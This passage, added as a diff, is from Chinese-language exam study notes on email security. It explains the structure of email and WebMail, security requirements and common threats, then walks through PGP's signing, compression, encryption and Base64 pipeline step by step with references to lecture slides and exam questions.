+  <line x1="346" y1="238" x2="430" y2="218" stroke="#3d3d3d" stroke-width="1.4" marker-end="url(#a2)"/>
+  <text x="388" y="246" font-size="10.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">SMTP</text>
+  <line x1="564" y1="238" x2="648" y2="208" stroke="#3d3d3d" stroke-width="1.4" marker-end="url(#a2)"/>
+  <text x="606" y="246" font-size="10" font-weight="700" fill="#9d2f1c" text-anchor="middle">HTTP/HTTPS</text>
+
+  <rect x="8" y="272" width="744" height="24" rx="4" fill="#f6f7f8" stroke="#c8c8c8"/>
+  <text x="380" y="288" font-size="11" font-weight="700" text-anchor="middle">关键差别：只有<tspan fill="#9d2f1c">「用户 ↔ 自己的邮件服务器」</tspan>这两段换成了 HTTP/HTTPS；<tspan fill="#14508c">服务器之间那一段永远是 SMTP</tspan>。</text>
+</svg>
+<figcaption>图 10-1 电子邮件的最主要组成构件 —— 上：用户代理方式；下：WebMail 方式</figcaption>
+</figure>
+
+<div class="box">
+  <div class="box-t">这张图为什么重要</div>
+  <p>因为它一眼说清了 <b>WebMail 是把浏览器塞进了用户代理的位置</b>。
+  浏览器一进来，第 9 章 Web 应用的全部毛病（表单被爆破、脚本注入、Cookie 被偷）就顺着这条路进了邮箱 —— 这正是 §3 存在的理由。<br>
+  <b>顺带解释单选 13</b>：Wireshark 抓得到学校邮箱的用户名口令，抓不到 QQ 邮箱的，是因为 <b>QQ 邮箱只允许 HTTPS 登录</b>（内容被加密），而学校邮箱走的是明文 HTTP。</p>
+</div>
+
+<h3>1.3 邮件的组成与地址格式 <span class="bref">课本 p.308</span></h3>
+
+<dl class="kv">
+<dt>信封 envelope</dt><dd>邮件传输程序<b>根据信封上的信息来传送邮件</b>。信封上最重要的就是收信人地址。</dd>
+<dt>内容 content</dt><dd>用户从自己邮箱里读取邮件时<b>才能见到</b>的部分。</dd>
+<dt>地址格式</dt><dd><code>收信人邮箱名@邮箱所在主机的域名</code>。<b>@ 读作 at，表示"在"</b>。<br>
+邮箱名在该主机中唯一 + 主机域名在因特网上唯一 ⇒ <b>每个邮件地址全网唯一</b>。</dd>
+<dt>怎么路由</dt><dd>发信时邮件服务器<b>只用地址的后一部分（域名）</b>，通过 DNS 的 <b>MX（Mail eXchanger）记录</b>找到企业内部真正的邮件服务器 IP；MX 记录里还含优先级信息。邮件到了目的主机后，才用前一部分（邮箱名）把它放进对应邮箱。</dd>
+</dl>
+
+<h3>1.4 四项安全需求 <span class="pref">PPT p.4</span> <span class="bref">课本表 10-1</span></h3>
+
+<table>
+<thead><tr><th style="width:16%">安全需求</th><th>说 明（课本原文，可直接抄）</th><th style="width:24%">没有它会怎样</th></tr></thead>
+<tbody>
+<tr><td><b>机密性</b></td><td>保证邮件在传输过程中不会被第三方窃取，只有邮件的真正接收方才能够阅读邮件的内容，<b>即使发错邮件，接收方也无法看到邮件内容</b></td><td>邮件内容被窃听</td></tr>
+<tr><td><b>完整性</b></td><td>保证邮件在传输过程中不会被修改</td><td>中途被改，收信人看不出</td></tr>
+<tr><td><b>不可否认性</b></td><td>保证邮件发送人不能否认其发过的邮件</td><td>发了能赖掉</td></tr>
+<tr><td><b>真实性</b></td><td>保证邮件的发送人不是冒名顶替的，它同邮件完整性一起可防止攻击者伪造邮件</td><td>电子邮件欺骗、钓鱼</td></tr>
+</tbody>
+</table>
+
+<div class="box trap">
+  <div class="box-t">⚠ 陷阱：这张表里<b>没有「可用性」</b></div>
+  <p>单选 3 直接考「下列电子邮件的安全属性中，PGP <b>不支持</b>的是」，答案就是 <b>A. 可用性</b>。
+  记法：PGP 是在<b>邮件正文</b>上做密码学处理的，它管得了"内容能不能被看/被改/赖不赖账"，
+  <b>管不了"服务在不在"</b> —— 服务器被打瘫、邮箱被塞爆，PGP 一点办法没有。</p>
+</div>
+
+<h3>1.5 五类常见安全问题 <span class="pref">PPT p.5</span> <span class="bref">课本 p.309</span></h3>
+
+<p><b>根因只有一句</b>：<span class="bref">课本 p.309</span>「基于 SMTP、POP3/IMAP 等协议的电子邮件系统<b>由于本身没有采取必要的安全防护措施</b>，如邮件的发送和接收<b>没有经过鉴别和确认</b>，邮件内容<b>没有经过加密</b>」。</p>
+
+<table>
+<thead><tr><th style="width:5%" class="c">#</th><th style="width:20%">问题</th><th>课本怎么解释的 / 为什么会发生</th></tr></thead>
+<tbody>
+<tr><td class="c">1</td><td><b>邮件内容被窃听</b></td><td>SMTP 发信时邮件<b>以明文方式在网上传输</b>，也<b>以明文方式保存在邮件服务器的用户邮箱中</b>。只要能进入邮箱或在传输中截获，就能看到原文甚至更改内容，而<b>接收者无法知道所收邮件是否真实</b>。<br><span class="small">→ 注意"两处明文"：线上明文 + 服务器上明文。这解释了为什么 §2 的端到端加密不可替代 —— IPsec/TLS 只护住了线上那一段。</span></td></tr>
+<tr><td class="c">2</td><td><b>垃圾邮件 Spam</b></td><td>未经用户请求<b>强行发送</b>到用户邮箱中的、<b>不受欢迎、难以退掉</b>的邮件或邮件列表，含广告、骚扰、传播违法信息。<br><b>危害</b>：增加网络负载影响传输速度；耗费收件人时间、精力和金钱，严重时耗尽邮箱存储空间；影响邮箱服务商形象，<b>频繁转发垃圾邮件的主机常被 ISP 列入垃圾邮件数据库，导致该主机访问网络受限</b>。→ §4</td></tr>
+<tr><td class="c">3</td><td><b>邮件炸弹</b></td><td><b>短时间内</b>向受害邮箱发送<b>大量</b>垃圾邮件或者发送<b>超大</b>的垃圾邮件，导致目标邮箱存储空间耗尽、无法接收正常邮件，造成所有发给该用户的邮件被主机退回。<br><span class="small">→ 本质是针对邮箱的 DoS，攻的是"可用性"。</span></td></tr>
+<tr><td class="c">4</td><td><b>传播恶意代码</b><br><span class="small">（钓鱼邮件）</span></td><td>通过邮件信息、<b>特别是通过邮件附件</b>来传播病毒、木马、蠕虫等恶意软件，<b>这也是 APT 攻击最常使用的攻击手段</b>（俗称"钓鱼邮件"）。</td></tr>
+<tr><td class="c">5</td><td><b>电子邮件欺骗</b></td><td><b>假冒一个用户给其他用户发邮件</b>。根因：<b>发邮件时不需要身份认证，任何人都可以冒名发送</b>。<br>常见手法：取一个相似的邮箱名，在 WebMail 的邮箱配置中把<b>「发件人姓名」配置成与被冒充者一样</b>，然后冒充其发信。收件人往往<b>不会去看邮件地址和信息头</b>，从姓名和内容上又看不出异样，就上当了。<br><span class="small">课本图 10-2：发件人名称写成"网易账号中心"，但后面的地址 <code>czfyjlh@163.com</code> 根本不是网易账号中心的邮箱（通常是 <code>admin@163.com</code>）。</span></td></tr>
+</tbody>
+</table>
+
+<h3>1.6 四类安全措施（PPT 只列了 3 条）<span class="pref">PPT p.6</span> <span class="bref">课本 p.310</span></h3>
+
+<table>
+<thead><tr><th style="width:6%" class="c">#</th><th style="width:23%">措施</th><th>做什么 / 补哪一段</th><th style="width:14%">对应本资料</th></tr></thead>
+<tbody>
+<tr><td class="c">1</td><td><b>端到端的安全<br>电子邮件技术</b></td><td>保证邮件<b>从发出到接收的整个过程中</b>，内容<b>保密、无法修改且不可否认</b>。三种方案：<b>PEM、PGP、S/MIME</b>。<br><span class="small">优势：只处理邮件正文，<b>不用改邮件服务器</b>。</span></td><td><b>§2（重点）</b></td></tr>
+<tr><td class="c">2</td><td><b>传输安全增强技术</b></td><td>在<b>网络层或传输层</b>使用安全协议（<b>IPsec、SSL/TLS</b>）来保证应用层的电子邮件在安全的传输通道上传输。<br><b>要求客户端和服务器端都支持</b>所使用的安全传输机制。</td><td><span class="small">第 6、7 章</span></td></tr>
+<tr><td class="c">3</td><td><b>邮件服务器安全增强</b></td><td>一方面用常规的<b>防火墙、入侵检测系统</b>保护服务器；另一方面在服务器中增加攻击检测与防护能力，特别是<b>反垃圾邮件检测、邮件恶意代码检测、拒绝服务攻击检测</b>。</td><td><b>§4</b></td></tr>
+<tr style="background:#fafafa;color:#5a5a5a"><td class="c">4</td><td><b>邮件发送方身份验证</b><br><span class="small">PPT 未讲</span></td><td>为确保真实性，IETF 对传统邮件协议做的一系列扩展。<b>课本自己也只列了名字，明说"限于篇幅不介绍详细内容"。</b></td><td><span class="small">下方灰框</span></td></tr>
+</tbody>
+</table>
+
+<div class="box beyond">
+  <div class="box-t">PPT 未讲 · 不作要求 —— 发送方身份验证的四个缩写 <span class="bref">课本 p.310</span></div>
+  <p>放在这里只是为了让你看到这四个缩写时不发慌。<b>老师 PPT 一页没提，考到的概率很低</b>，真要查就翻课本 p.310。</p>
+  <ul style="margin:.2em 0">
+  <li><b>SPF</b>（发件人策略框架）：查询<b>发送域经过的 SMTP 服务器是否在发送域指定允许的 IP 段内</b>。</li>
+  <li><b>DKIM</b>（域名密钥识别邮件）：不仅能检查发件人身份信息，<b>还能检测邮件内容是否被篡改</b>。</li>
+  <li><b>DMARC</b>：2015 年颁布，<b>为 SPF 和 DKIM 提供反馈机制</b>。</li>
+  <li><b>DANE</b>：2016 年 IETF 提出，<b>基于 DNSSEC</b>，与 DMARC 互相补充，确保安全扩展协议检测结果的正确性及通信双方信道安全。</li>
+  </ul>
+</div>
+<h2 class="pagebreak"><span class="n">§2</span>安全电子邮件标准 PGP <span class="pref">PPT p.8–27（20 页，占正文 56%）</span> <span class="bref">课本 10.3</span></h2>
+
+<div class="chain">
+  <div class="chain-i prev"><div class="chain-k">承上</div><div class="chain-b">协议本身明文、不认证，而<b>改协议、改服务器动静太大</b>。</div></div>
+  <div class="chain-i now"><div class="chain-k">本节</div><div class="chain-b">换个思路：<b>只在邮件正文这一层做手脚</b>，收发双方的用户代理各自加解密，中间的服务器一律不动。</div></div>
+  <div class="chain-i next"><div class="chain-k">留下的坑</div><div class="chain-b">加密要用<b>对方的公钥</b> —— 可我凭什么相信这把公钥真是他的？→ §2.8 密钥管理与信任网</div></div>
+</div>
+
+<h3>2.1 三种端到端标准：为什么最后活下来的是 PGP <span class="pref">PPT p.8–12</span> <span class="bref">课本 p.310–311</span></h3>
+
+<div class="scene">
+  <div class="scene-k">PPT p.8 · 老师的开场</div>
+  <p class="scene-q">端到端的安全电子邮件标准和协议主要有三种：PEM、S/MIME、PGP。</p>
+  <div class="scene-b"><p>三种方案<b>各自使用不同的安全方案，相互不兼容，导致无法实现互操作</b><span class="bref">课本 p.310</span>。
+  所以这不是"三个版本"，而是"三条互不相通的路"。老师后面只细讲 PGP。</p></div>
+</div>
+
+<table>
+<thead><tr><th style="width:9%">标准</th><th style="width:26%">是什么</th><th>优点</th><th style="width:30%">致命缺点 / 结局</th></tr></thead>
+<tbody>
+<tr><td><b>PEM</b><br><span class="small">Privacy<br>Enhanced Mail<br>隐私增强<br>电子邮件</span></td><td>美国 <b>RSA 实验室</b>基于 <b>RSA 和 DES</b> 算法开发的安全电子邮件方案。在电子邮件标准格式上增加了<b>加密、认证、消息完整性保护和密钥管理</b>功能。</td><td>出现最早；四项功能一次配齐。</td><td>① <b>在 MIME 之前提出，因此不支持 MIME，只支持文本信息</b>（发不了附件、发不了二进制）；<br>② <b>依赖 PKI 并遵循 X.509 认证协议</b>，而当时要建一个可用的 PKI 并不容易。<br>→ <b>没能普及</b>。</td></tr>
+<tr><td><b>S/MIME</b><br><span class="small">Secure/<br>Multipurpose<br>Internet Mail<br>Extensions</span></td><td><b>在 PEM 基础上发展起来</b>，使用 RSA 提出的 <b>PKCS</b>（公钥加密标准）和 <b>MIME</b> 来增强邮件安全：对邮件主体做<b>完整性保护、签名和加密后，作为特殊的附件发送</b>。</td><td>① 支持任意 MIME 数据，<b>不限于邮件</b>——任何支持 MIME 格式的传输机制或协议（如 HTTP）均可用；<br>② <b>获得广泛行业支持，已内置于大多数邮件客户端（Outlook、Foxmail）和 Web 浏览器</b>。</td><td><b>认证机制依赖层次结构的证书认证机构</b>：所有下一级的组织和个人的证书由上一级组织负责认证，<b>整个信任关系是树状结构</b>，因此<b>比较适合具有层次结构的组织使用</b> —— 个人要用得先去申请证书，门槛高。<br><span class="small">版本：v1 于 1995 年完成（MIME 是 1992 年推出的），v2 见 RFC 2311/2312，v3 见 RFC 3850/3851。<b>这些 RFC 是信息文件，而不是标准或建议的标准</b>。</span></td></tr>
+<tr style="background:#eaf1f8"><td><b>PGP</b><br><span class="small">Pretty Good<br>Privacy<br>优良隐私保护</span></td><td>美国人<b>菲利普·齐默尔曼</b>（Philip R. Zimmermann）于 <b>1991 年</b>开发。<b>PGP 既是一个特定的安全电子邮件应用软件，也是一个安全电子邮件标准。</b></td><td>① <b>不依赖统一的 CA</b>，普通人也能直接用；<br>② 有免费实现，生态丰富；<br>③ <b>不限于邮件</b>——也可用于任何需要保证传输机密性、完整性和认证的应用。</td><td>信任靠"人拉人"（信任网），<b>难以规模化</b>；<b>缺少 PKI 那样严格的证书撤销机制</b>（课本原话：<b>是 PGP 安全体系中比较薄弱的环节</b>）。<br>→ <b>但它是本章唯一细讲、也是考试重点的那一个。</b></td></tr>
+</tbody>
+</table>
+
+<div class="box">
+  <div class="box-t">PGP 的身世（选择题偶尔考年份和缩写）<span class="pref">PPT p.11</span></div>
+  <p><b>1991</b> 齐默尔曼开发 PGP → <b>1997 年 7 月</b>，PGP 公司与齐默尔曼同意由 <b>IETF</b> 制定一项公开的互联网安全电子邮件标准，称作 <b>OpenPGP</b>（RFC 2440、3156、4880、5581、6637 等）。
+  任何支持这一标准的软件也被允许称为 OpenPGP。<br>
+  由于 <b>PGP 属于商业软件</b>（早期免费，从 8.1 版开始收费），于是<b>自由软件基金会 OSF 开发了符合 OpenPGP 标准的「GnuPG」（简称 GPG）</b>，图形界面版本有 <b>Gpg4win、KGPG、Seahorse、MacGPG</b>，iOS/Android 上有 <b>iPGMail、OpenKeychain</b>。齐默尔曼还组建了 <b>OpenPGP 联盟</b>。</p>
+</div>
+
+<h3>2.2 PGP 提供哪些功能、各用什么算法 <span class="pref">PPT p.13</span> <span class="bref">课本表 10-2</span></h3>
+
+<p>这张表是<b>整节的地基</b>，五行对应 PGP 的五个动作。<b>算法名要能默写。</b></p>
+
+<table>
+<thead><tr><th style="width:15%">功能服务</th><th style="width:34%">采用的算法</th><th>说明 + 它在解决什么</th></tr></thead>
+<tbody>
+<tr><td><b>数字签名</b><br><span class="small">（包括身份鉴别）</span></td><td><b>散列算法</b>：SHA-1、SHA224、SHA256、SHA384、SHA512、<b>MD5</b>、RIPEMD160 等<br><b>签名算法</b>：<b>DSS 或 RSA</b></td><td><b>先用散列函数</b>（如 SHA-1）产生消息的散列码，<b>然后用 DSS 或 RSA 算法对散列码进行签名</b>。<br><span class="small">→ 解决<b>真实性 + 不可否认性 + 完整性</b>。为什么不直接签整封邮件？因为公钥运算太慢，签 160 位的散列值一次就够。</span></td></tr>
+<tr><td><b>消息加密</b></td><td><b>对称密码算法</b>：CAST-128、IDEA、3DES、AES<br><b>公开密码算法</b>：RSA、Diffie-Hellman</td><td>消息用<b>一次性会话密钥（对称密钥）加密</b>，<b>会话密钥用接收方的公钥加密</b>。<br><span class="small">→ 解决<b>机密性</b>。这个"两层套娃"就是<b>数字信封</b>，见 §2.5。</span></td></tr>
+<tr><td><b>压缩</b></td><td><b>ZIP、ZLIB、BZIP2</b></td><td>消息用 ZIP/ZLIB/BZIP2 算法<b>压缩后存储或传送</b>。<br><span class="small">→ 省流量省空间，<b>顺带让加密更安全</b>（见 §2.6 讨论一）。</span></td></tr>
+<tr><td><b>邮件兼容性</b></td><td><b>Radix 64</b></td><td>邮件应用安全透明，加密后的消息用 <b>Radix 64</b> 转换（<b>也就是 MIME 的 Base64 编码</b>）。<br><span class="small">→ 解决"二进制密文过不了只认 ASCII 的邮件系统"。见 §2.6 讨论二。</span></td></tr>
+<tr><td><b>数据分段</b></td><td class="c">—<span class="small">（无特定算法）</span></td><td><b>为了满足邮件的大小限制，支持分段和重组。</b><br><span class="small">→ 见 §2.6 讨论三。</span></td></tr>
+</tbody>
+</table>
+
+<div class="box trap">
+  <div class="box-t">⚠ 这张表里藏着两道选择题</div>
+  <p><b>单选 10</b>「PGP <b>没有</b>用来加密会话的密码算法是（<b>C. RSA</b>）」：消息本身一律用<b>对称</b>算法加密（CAST-128/IDEA/3DES/AES），
+  <b>RSA 只干两件事 —— 签散列值、加密会话密钥，从不直接加密邮件正文</b>。<br>
+  <b>单选 14</b>「没有采用公开密码算法进行对称会话密钥分发的是（<b>B. Needham-Schroeder</b>）」：PGP / TLS / SSL 都用公钥来传会话密钥，
+  只有 N-S 协议靠<b>可信第三方 KDC + 双方各自与 KDC 共享的对称主密钥</b>来分发。</p>
+</div>
+
+<h3>2.3 PGP 发送方的完整流水线（这是全章最该背下来的一张图）<span class="pref">PPT p.14、p.21</span> <span class="bref">课本图 10-3(a)</span></h3>
+
+<div class="scene">
+  <div class="scene-k">先想清楚这个顺序问题</div>
+  <p class="scene-q">签名、压缩、加密，三件事到底谁先谁后？</p>
+  <div class="scene-b"><p>这正是 <span class="pref">PPT p.24</span> 老师专门开了一页问、却没给答案的那道讨论题，也是 <b>单选 4</b> 和 <b>简答 2</b>。
+  答案先给你：<b class="mark">先签名 → 再压缩 → 最后加密</b>（然后 Base64、最后分段）。理由见 §2.6。</p></div>
+</div>
+
+<figure>
+<svg viewBox="0 0 760 300" role="img" aria-label="PGP 发送方处理流水线">
+  <defs>
+    <marker id="a3" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#14508c"/></marker>
+    <marker id="a4" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#9d2f1c"/></marker>
+  </defs>
+
+  <text x="8" y="14" font-size="12" font-weight="700" fill="#0e3d6e">发送方 A 的处理流水线（自上而下走一遍，箭头方向就是顺序）</text>
+
+  <!-- 输入 -->
+  <rect x="8" y="26" width="96" height="30" rx="4" fill="#fff" stroke="#3d3d3d" stroke-width="1.4"/>
+  <text x="56" y="46" font-size="11.5" font-weight="700" text-anchor="middle">邮件正文 M</text>
+
+  <!-- 1 散列 -->
+  <rect x="128" y="26" width="104" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="180" y="45" font-size="11" text-anchor="middle">① 散列 H(M)</text>
+  <line x1="106" y1="41" x2="124" y2="41" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+
+  <!-- 2 签名 -->
+  <rect x="256" y="26" width="104" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="308" y="45" font-size="11" text-anchor="middle">② 签名</text>
+  <line x1="234" y1="41" x2="252" y2="41" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+  <rect x="256" y="62" width="104" height="24" rx="4" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="308" y="78" font-size="10.5" font-weight="700" fill="#9d2f1c" text-anchor="middle">用 A 的私钥 PR_A</text>
+  <line x1="308" y1="60" x2="308" y2="60" stroke="#9d2f1c"/>
+  <line x1="308" y1="62" x2="308" y2="58" stroke="#9d2f1c" stroke-width="1.3" marker-end="url(#a4)"/>
+
+  <!-- 3 拼接 -->
+  <rect x="384" y="26" width="104" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="436" y="45" font-size="11" text-anchor="middle">③ 拼接</text>
+  <line x1="362" y1="41" x2="380" y2="41" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+  <text x="436" y="72" font-size="10" fill="#6d6d6d" text-anchor="middle">签名 ‖ 邮件正文</text>
+
+  <!-- 4 压缩 -->
+  <rect x="512" y="26" width="104" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="564" y="45" font-size="11" text-anchor="middle">④ 压缩 ZIP</text>
+  <line x1="490" y1="41" x2="508" y2="41" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+
+  <!-- 5 对称加密 -->
+  <rect x="640" y="26" width="112" height="30" rx="4" fill="#eaf1f8" stroke="#14508c" stroke-width="1.6"/>
+  <text x="696" y="45" font-size="11" font-weight="700" text-anchor="middle">⑤ 对称加密</text>
+  <line x1="618" y1="41" x2="636" y2="41" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+
+  <!-- 会话密钥支线 -->
+  <rect x="560" y="104" width="90" height="26" rx="4" fill="#fff" stroke="#3d3d3d"/>
+  <text x="605" y="121" font-size="10.5" text-anchor="middle">PRG 伪随机</text>
+  <rect x="560" y="140" width="90" height="26" rx="4" fill="#faf5e6" stroke="#ddc98a"/>
+  <text x="605" y="157" font-size="10.5" font-weight="700" fill="#7a5a10" text-anchor="middle">会话密钥 Ks</text>
+  <line x1="605" y1="130" x2="605" y2="136" stroke="#14508c" stroke-width="1.3" marker-end="url(#a3)"/>
+  <path d="M650,153 L696,153 L696,60" fill="none" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+  <text x="700" y="80" font-size="10" fill="#6d6d6d">Ks 加密正文</text>
+
+  <rect x="680" y="140" width="72" height="26" rx="4" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="716" y="157" font-size="10" font-weight="700" fill="#9d2f1c" text-anchor="middle">用 PU_B 加密</text>
+  <line x1="652" y1="153" x2="676" y2="153" stroke="#9d2f1c" stroke-width="1.3" marker-end="url(#a4)"/>
+  <text x="716" y="178" font-size="9.5" fill="#9d2f1c" text-anchor="middle">＝ 数字信封</text>
+
+  <!-- 6 拼接 + Base64 + 分段 -->
+  <rect x="330" y="196" width="130" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="395" y="215" font-size="11" text-anchor="middle">⑥ 拼接</text>
+  <text x="395" y="238" font-size="10" fill="#6d6d6d" text-anchor="middle">加密的 Ks ‖ 邮件密文</text>
+
+  <path d="M696,170 L696,211 L466,211" fill="none" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+
+  <rect x="176" y="196" width="130" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="241" y="215" font-size="11" text-anchor="middle">⑦ Base64 编码</text>
+  <line x1="326" y1="211" x2="310" y2="211" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+  <text x="241" y="238" font-size="10" fill="#6d6d6d" text-anchor="middle">二进制 → ASCII 文本</text>
+
+  <rect x="22" y="196" width="130" height="30" rx="4" fill="#eaf1f8" stroke="#14508c"/>
+  <text x="87" y="215" font-size="11" text-anchor="middle">⑧ 分段（如需要）</text>
+  <line x1="172" y1="211" x2="156" y2="211" stroke="#14508c" stroke-width="1.4" marker-end="url(#a3)"/>
+  <text x="87" y="238" font-size="10" fill="#6d6d6d" text-anchor="middle">超 50 000 字节才做</text>
+
+  <rect x="8" y="258" width="744" height="36" rx="4" fill="#faf5e6" stroke="#ddc98a"/>
+  <text x="380" y="274" font-size="11.5" font-weight="700" fill="#7a5a10" text-anchor="middle">一句话记住整条线：散列 → 签名 → 拼接 → 压缩 → 加密 → 拼接 → Base64 → 分段</text>
+  <text x="380" y="289" font-size="10.5" fill="#7a5a10" text-anchor="middle">简化成三个词就是：先签名，再压缩，最后加密。</text>
+</svg>
+<figcaption>PGP 发送方 A 的处理过程（据 PPT p.14、p.21 与课本图 10-3(a) 重绘）</figcaption>
+</figure>
+
+<div class="box key">
+  <div class="box-t">接收方就是把这条线倒着走一遍</div>
+  <p><b>重组 → Base64 解码 → 分解 → 用 B 的私钥 PR_B 解出 Ks → 用 Ks 对称解密 → 解压缩 → 分解出签名和正文 → 用 A 的公钥 PU_A 验签 → 对比散列值</b>。<br>
+  <b>注意最后一步的判定</b>：接收方自己对收到的正文重新算一遍散列值，跟验签恢复出来的散列值<b>比较</b>——
+  <b>相等则鉴别成功，不等则鉴别失败</b><span class="bref">课本图 10-3(b)</span>。</p>
+</div>
+
+<h3>2.4 逐步拆解：PPT 那 9 页流程图讲了什么 <span class="pref">PPT p.15–23</span></h3>
+
+<div class="box trap">
+  <div class="box-t">⚠ 这 9 页<b>课本上没有</b>，是老师专门加进来的 —— 按本资料开头的判据，几乎一定考</div>
+  <p>PPT 把 PGP 拆成了<b>四条独立的流程</b>（只加密／只解密／只签名／只验签），最后再合成完整流程。
+  下面按 PPT 的原始步骤号逐条列出，<b>每一步后面补一句"为什么要有这一步"</b>。</p>
+</div>
+
+<h4>(A) 只加密：PGP 加密过程 <span class="pref">PPT p.15，共 6 步</span></h4>
+<div class="steps">
+  <div class="step"><div class="sb">用<b>伪随机数生成器</b>生成<b>会话密钥</b>。</div>
+    <div class="sw"><b>为什么：</b>每封邮件一把新钥匙，用完即弃。即使某一次被泄露，也不影响下次。</div></div>
+  <div class="step"><div class="sb">用<b>公钥密码</b>加密会话密钥（<b>用接收者的公钥</b>）。</div>
+    <div class="sw"><b>为什么：</b>对称密钥怎么安全送到对方手上？——套进只有对方私钥能打开的信封里。<b>这一步就是"数字信封"。</b></div></div>
+  <div class="step"><div class="sb">压缩消息。</div>
+    <div class="sw"><b>为什么：</b>省流量省空间，并且减少明文冗余、让后一步的加密更难被分析。<b>注意压缩排在加密之前。</b></div></div>
+  <div class="step"><div class="sb">使用<b>对称密码</b>对<b>压缩后的</b>消息进行加密，密钥是步骤 1 生成的会话密钥。</div>
+    <div class="sw"><b>为什么：</b>邮件正文可能很长，公钥算法慢得没法用，只能上对称算法。</div></div>
+  <div class="step"><div class="sb">将<b>加密的会话密钥</b>（步骤 2）与<b>加密的消息</b>（步骤 4）<b>拼合</b>起来。</div>
+    <div class="sw"><b>为什么：</b>钥匙必须跟着锁一起寄，否则对方拿到密文也打不开。</div></div>
+  <div class="step"><div class="sb">将步骤 5 的结果<b>转换为文本数据</b>，转换后的结果就是<b>报文数据</b>。</div>
+    <div class="sw"><b>为什么：</b>前面出来的是二进制，很多邮件系统只收 ASCII。这就是 Base64（Radix 64）。</div></div>
+</div>
+
+<h4>(B) 只解密：PGP 解密过程 <span class="pref">PPT p.16，共 9 步</span></h4>
+<div class="steps">
+  <div class="step"><div class="sb">接收者<b>输入解密的口令</b>。</div>
+    <div class="sw"><b>为什么：</b>私钥自己也是加密存放在私钥环里的 —— 前 3 步都在"先把自己的私钥解出来"。</div></div>
+  <div class="step"><div class="sb">求<b>口令的散列值</b>，生成用于解密私钥的密钥。</div>
+    <div class="sw"><b>为什么：</b>口令长度不定，散列一下正好得到定长的对称密钥。<span class="bref">课本 p.315：SHA-1 → 160 比特</span></div></div>
+  <div class="step"><div class="sb">将<b>钥匙串（私钥环）</b>中经过加密的私钥进行解密，得到<b>接收者的私钥</b>。</div>
+    <div class="sw"><b>为什么：</b>就算电脑被偷，没有口令也拿不到私钥。</div></div>
+  <div class="step"><div class="sb">将报文数据（文本数据）<b>转换成二进制数据</b>。</div>
+    <div class="sw"><b>为什么：</b>撤销发送方的 Base64 编码。</div></div>
+  <div class="step"><div class="sb">将二进制数据<b>分解</b>成两部分：<b>加密的会话密钥</b>、<b>经过压缩和加密的消息</b>。</div>
+    <div class="sw"><b>为什么：</b>把"钥匙"和"锁着的箱子"分开。</div></div>
+  <div class="step"><div class="sb">用<b>公钥密码算法解密会话密钥</b>，使用步骤 3 中得到的<b>接收者的私钥</b>。</div>
+    <div class="sw"><b>为什么：</b>拆信封，取出对称钥匙。</div></div>
+  <div class="step"><div class="sb">用<b>对称密码</b>解密"经过压缩和加密的消息"，使用步骤 6 得到的<b>会话密钥</b>。</div>
+    <div class="sw"><b>为什么：</b>开箱。此时拿到的还是压缩包。</div></div>
+  <div class="step"><div class="sb">对步骤 7 得到的<b>经过压缩的消息进行解压缩</b>。</div>
+    <div class="sw"><b>为什么：</b>撤销发送方的压缩。<b>顺序必须是"先解密再解压"</b>，与发送方"先压缩再加密"严格对称。</div></div>
+  <div class="step"><div class="sb">得到<b>原始消息</b>。</div></div>
+</div>
+
+<h4>(C) 只签名：生成签名 <span class="pref">PPT p.18，共 9 步</span></h4>
+<div class="steps">
+  <div class="step"><div class="sb">发送者<b>输入签名用的口令</b>。</div></div>
+  <div class="step"><div class="sb">求口令的散列值，生成用于解密私钥的密钥。</div><div class="sw">图上还画了一个<b>「盐」</b>与口令拼合后再散列 —— 防止彩虹表。</div></div>
+  <div class="step"><div class="sb">将钥匙串中经过加密的<b>私钥</b>进行解密。</div></div>
+  <div class="step"><div class="sb">用<b>单向散列函数</b>计算<b>消息</b>的散列值。</div>
+    <div class="sw"><b>为什么：</b>把任意长的邮件压成定长指纹，公钥运算只需做一次。</div></div>
+  <div class="step"><div class="sb">对步骤 4 得到的<b>散列值进行签名</b>。<span class="small">PPT 原话：这一步相当于使用步骤 3 中得到的私钥进行加密。</span></div>
+    <div class="sw"><b>为什么：</b>只有持私钥的人能生成，人人可用其公钥验证 → 真实性 + 不可否认性。<b>关于"签名"和"加密"这两个说法，见下面的术语对照。</b></div></div>
+  <div class="step"><div class="sb">将步骤 5 生成的<b>数字签名与消息拼合</b>。</div>
+    <div class="sw"><b>为什么：</b>验签时要拿原文重算散列值来对比，所以原文必须一起发。</div></div>
+  <div class="step"><div class="sb">将步骤 6 的结果<b>进行压缩</b>。</div>
+    <div class="sw"><b>为什么：</b>注意 —— <b>是先拼好签名再压缩，不是压缩后再签名。</b>这就是那道讨论题的核心。</div></div>
+  <div class="step"><div class="sb">将步骤 7 的结果<b>转换为文本数据</b>。</div><div class="sw">Base64。</div></div>
+  <div class="step"><div class="sb">步骤 8 的结果就是<b>报文数据</b>。</div></div>
+</div>
+
+<h4>(D) 只验签：验证签名 <span class="pref">PPT p.19，共 8 步</span></h4>
+<div class="steps">
+  <div class="step"><div class="sb">将报文数据（文本数据）<b>转换为二进制数据</b>。</div></div>
+  <div class="step"><div class="sb">将经过压缩的数据<b>进行解压缩</b>。</div></div>
+  <div class="step"><div class="sb"><b>分解</b>成"经过签名的散列值"和"消息"两部分。</div></div>
